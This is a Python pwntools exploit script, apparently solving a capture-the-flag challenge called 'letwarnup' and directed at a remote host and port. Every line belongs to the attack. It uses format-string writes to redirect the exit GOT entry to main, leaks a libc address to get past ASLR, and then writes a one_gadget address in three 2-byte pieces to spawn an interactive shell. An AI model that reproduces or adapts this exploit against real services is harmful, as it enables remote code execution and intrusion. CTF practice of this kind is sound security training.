from pwn import *

context.binary = './letwarnup'
elf = ELF('./letwarnup')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = process('./letwarnup')
p = remote('45.122.249.68', 10005)

got_exit = elf.got['exit']
main = elf.sym['main']
plt_malloc = elf.sym['malloc']
pop_rbp = 0x4011bd

payload = b'%c'*6
payload += b'%' + str(got_exit - 6).encode('utf-8') + b'c'
payload += b'%lln'
payload += b'%' + str((main - got_exit) & 0xffff).encode('utf-8') + b'c'
payload += b'%hn'
payload += b'-%p-'

p.recv()
p.sendline(payload)

p.recvuntil(b'-')

libc.address = int(p.recvuntil(b'-')[:-1], 16) - libc.sym['__libc_start_main'] - 243
one_gadget = libc.address + 0xe6c81

first = u32(p64(one_gadget)[:2].ljust(4, b'\x00'))
second = u32(p64(one_gadget)[2:4].ljust(4, b'\x00'))
third = u32(p64(one_gadget)[4:6].ljust(4, b'\x00'))

payload = b'%c'*6
payload += b'%' + str(got_exit - 6).encode('utf-8') + b'c'
payload += b'%lln'
payload += b'-'

p.recv()
p.sendline(payload)
p.recvuntil(b'-')

payload = b'%c'*6
payload += b'%' + str(got_exit + 2 - 6).encode('utf-8') + b'c'
payload += b'%lln'
payload += b'-'

p.recv()
p.sendline(payload)
p.recvuntil(b'-')

payload = b'%c'*6
payload += b'%' + str(got_exit + 4 - 6).encode('utf-8') + b'c'
payload += b'%lln'
payload += b'%' + str((third - got_exit - 4) & 0xffff).encode('utf-8') + b'c'
payload += b'%hn'
payload += b'%c'*4
payload += b'%' + str((second - third - 4) & 0xffff).encode('utf-8') + b'c'
payload += b'%hn'
payload += b'%c'*4
payload += b'%' + str((first - second - 4) & 0xffff).encode('utf-8') + b'c'
payload += b'%hn'
payload += b'-'

p.recv()
p.sendline(payload)
p.recvuntil(b'-')

p.interactive()